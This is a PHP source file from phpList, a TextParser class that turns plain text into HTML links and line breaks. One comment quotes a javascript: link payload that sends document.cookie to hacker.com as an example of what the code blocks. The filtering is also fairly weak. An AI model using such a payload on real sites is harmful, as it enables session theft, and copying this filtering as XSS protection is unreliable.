<?php

declare(strict_types=1);

namespace PhpList\Core\Domain\Messaging\Service;

class TextParser
{
    public function __invoke(string $text): string
    {
        // bug in PHP? get rid of newlines at the beginning of text
        $text = ltrim($text);

        // make urls and emails clickable
        $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i", '<a href="mailto:\\1" class="email">\\1</a>', $text);
        $link_pattern = "/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

        $i = 0;
        while (preg_match($link_pattern, $text, $matches)) {
            $url = $matches[2];
            $rest = $matches[3];
            if (!preg_match('/^(http:)|(mailto:)|(ftp:)|(https:)/i', $url)) {
                // avoid this
                //<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                $url = preg_replace('/:/', '', $url);
            }
            $link[$i] = '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
            $text = $matches[1]."%%$i%%".$matches[5];
            ++$i;
        }

        $text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", 'http://\\1', $text); //make www. -> http://www.
        $text = preg_replace("/(https?:\/\/)http?:\/\//i", '\\1', $text); //take out duplicate schema
        $text = preg_replace("/(ftp:\/\/)http?:\/\//i", '\\1', $text); //take out duplicate schema
        $text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i",
            '<a href="\\1\\2" class="url" target="_blank">\\2</a>',
            $text); //eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

        $text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i",
            '<a href="\\1\\2\\3" class="url" target="_blank">\\2\\3</a>',
            $text); //eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

        // take off a possible last full stop and move it outside
        $text = preg_replace("/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i",
            '<a href="\\1" class="url" target="_blank">\\2</a>.', $text);

        for ($j = 0; $j < $i; ++$j) {
            $replacement = $link[$j];
            $text = preg_replace("/\%\%$j\%\%/", $replacement, $text);
        }

        // hmm, regular expression choke on some characters in the text
        // first replace all the brackets with placeholders.
        // we cannot use htmlspecialchars or addslashes, because some are needed

        $text = str_replace("\(", '<!--LB-->', $text);
        $text = str_replace("\)", '<!--RB-->', $text);
        $text = preg_replace('/\$/', '<!--DOLL-->', $text);

        // @@@ to be xhtml compabible we'd have to close the <p> as well
        // so for now, just make it two br/s, which will be done by replacing
        // \n with <br/>
        // $paragraph = '<p class="x">';
        $br = '<br />';
        $text = preg_replace("/\r/", '', $text);
        $text = preg_replace("/\n/", "$br\n", $text);

        // reverse our previous placeholders
        $text = str_replace('<!--LB-->', '(', $text);
        $text = str_replace('<!--RB-->', ')', $text);
        return str_replace('<!--DOLL-->', '$', $text);
    }
}
